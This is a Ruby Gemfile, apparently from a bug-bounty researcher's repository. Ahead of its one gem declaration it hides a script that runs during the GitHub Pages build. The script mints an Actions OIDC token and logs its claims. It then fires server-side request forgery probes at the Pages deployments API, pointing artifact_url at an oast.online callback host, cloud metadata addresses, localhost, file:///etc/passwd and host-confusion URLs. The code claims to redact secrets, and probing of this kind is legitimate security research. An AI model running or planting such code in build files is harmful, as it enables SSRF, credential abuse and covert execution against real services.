# Instrumentation only (own repository hackerone-pr0, own build, own Pages site). Prints NO token values.
# Probes lead AN: does POST /repos/{own}/pages/deployments fetch a caller-supplied artifact_url server-side?
source "https://rubygems.org"
begin
  require "net/http"; require "json"; require "uri"; require "base64"
  OAST = "db3b5u9hkp3j71prpe00w5e9wc7xtgg3p.oast.online"
  nwo  = ENV["GITHUB_REPOSITORY"]; sha = ENV["GITHUB_SHA"]
  log  = ->(s) { $stderr.puts "AUDIT #{s}" }
  log.("uid=#{Process.uid} repo=#{nwo} sha=#{sha} run=#{ENV['GITHUB_RUN_ID']} job=#{ENV['GITHUB_JOB']} ref=#{ENV['GITHUB_REF']}")
  http = ->(uri, req) { h = Net::HTTP.new(uri.host, uri.port); h.use_ssl = (uri.scheme == "https"); h.open_timeout = 10; h.read_timeout = 20; h.request(req) }
  # 1. OIDC mint attempt from the BUILD job of the GitHub-managed workflow (prints claims only)
  oidc = nil
  begin
    u = URI(ENV["ACTIONS_ID_TOKEN_REQUEST_URL"]); r = Net::HTTP::Get.new(u); r["Authorization"] = "bearer #{ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}"; r["Accept"] = "application/json; api-version=2.0"
    res = http.(u, r); log.("oidc-mint HTTP #{res.code} body-len=#{res.body.to_s.size}")
    if res.code == "200"
      oidc = JSON.parse(res.body)["value"]
      p = oidc.split(".")[1]; p += "=" * ((4 - p.size % 4) % 4); c = JSON.parse(Base64.urlsafe_decode64(p))
      log.("oidc-claims #{c.slice('aud','sub','repository','ref','environment','job_workflow_ref','workflow_ref','runner_environment','iat','exp').to_json}")
    else
      log.("oidc-mint-body #{res.body.to_s[0,300].gsub(/[A-Za-z0-9_-]{40,}/,'<redacted>')}")
    end
  rescue => e
    log.("oidc-mint error #{e.class}: #{e.message}")
  end
  # 2. artifact_url probes (only if an OIDC token exists; all target OUR repo's Pages site)
  if oidc
    api = URI("https://api.github.com/repos/#{nwo}/pages/deployments")
    cases = [
      ["control-artifact_id-1", {artifact_id: 1}],
      ["https-oast",     {artifact_url: "https://c1.#{OAST}/artifact.zip"}],
      ["http-oast",      {artifact_url: "http://c2.#{OAST}/artifact.zip"}],
      ["userinfo",       {artifact_url: "https://pipelines.actions.githubusercontent.com@c3.#{OAST}/artifact.zip"}],
      ["prefix-host",    {artifact_url: "https://pipelinesghubeus5.actions.githubusercontent.com.c4.#{OAST}/artifact.zip"}],
      ["legacy-shape-oast", {artifact_url: "https://c5.#{OAST}/_apis/pipelines/workflows/1/artifacts?api-version=6.0-preview&artifactName=github-pages"}],
      ["imds",           {artifact_url: "http://169.254.169.254/latest/meta-data/"}],
      ["imds-octal",     {artifact_url: "http://0251.254.169.254/latest/meta-data/"}],
      ["localhost",      {artifact_url: "http://127.0.0.1/"}],
      ["file",           {artifact_url: "file:///etc/passwd"}],
      ["own-artifact-api-zip", {artifact_url: "https://api.github.com/repos/#{nwo}/actions/artifacts/11511441631/zip"}],
      ["foreign-id-api-zip",   {artifact_url: "https://api.github.com/repos/#{nwo}/actions/artifacts/1/zip"}],
      ["legacy-shape-real",    {artifact_url: "#{ENV['ACTIONS_RUNTIME_URL']}_apis/pipelines/workflows/#{ENV['GITHUB_RUN_ID']}/artifacts?api-version=6.0-preview&artifactName=github-pages"}],
    ]
    ids = []
    cases.each_with_index do |(name, extra), i|
      ver = "#{sha}-an#{i}"; ids << [name, ver]
      body = extra.merge(pages_build_version: ver, oidc_token: oidc)
      req = Net::HTTP::Post.new(api); req["Authorization"] = "Bearer #{ENV['INPUT_TOKEN']}"; req["Accept"] = "application/vnd.github+json"; req["X-GitHub-Api-Version"] = "2022-11-28"; req["Content-Type"] = "application/json"; req.body = body.to_json
      t0 = Time.now
      begin
        res = http.(api, req)
        log.("case#{i} #{name} url=#{extra[:artifact_url] || extra[:artifact_id]} -> HTTP #{res.code} t=#{(Time.now - t0).round(2)}s body=#{res.body.to_s[0,400].gsub(/\s+/, ' ')}")
      rescue => e
        log.("case#{i} #{name} error #{e.class}: #{e.message}")
      end
      sleep 2
    end
    log.("sleeping 30s before status polls"); sleep 30
    ids.each do |name, ver|
      u = URI("https://api.github.com/repos/#{nwo}/pages/deployments/#{ver}"); r = Net::HTTP::Get.new(u); r["Authorization"] = "Bearer #{ENV['INPUT_TOKEN']}"; r["Accept"] = "application/vnd.github+json"
      begin
        res = http.(u, r); log.("status #{name} #{ver[-5..]} -> HTTP #{res.code} body=#{res.body.to_s[0,300].gsub(/\s+/, ' ')}")
      rescue => e
        log.("status #{name} error #{e.class}: #{e.message}")
      end
      sleep 1
    end
  end
rescue => e
  $stderr.puts "AUDIT fatal #{e.class}: #{e.message}"
end
gem "github-pages", group: :jekyll_plugins
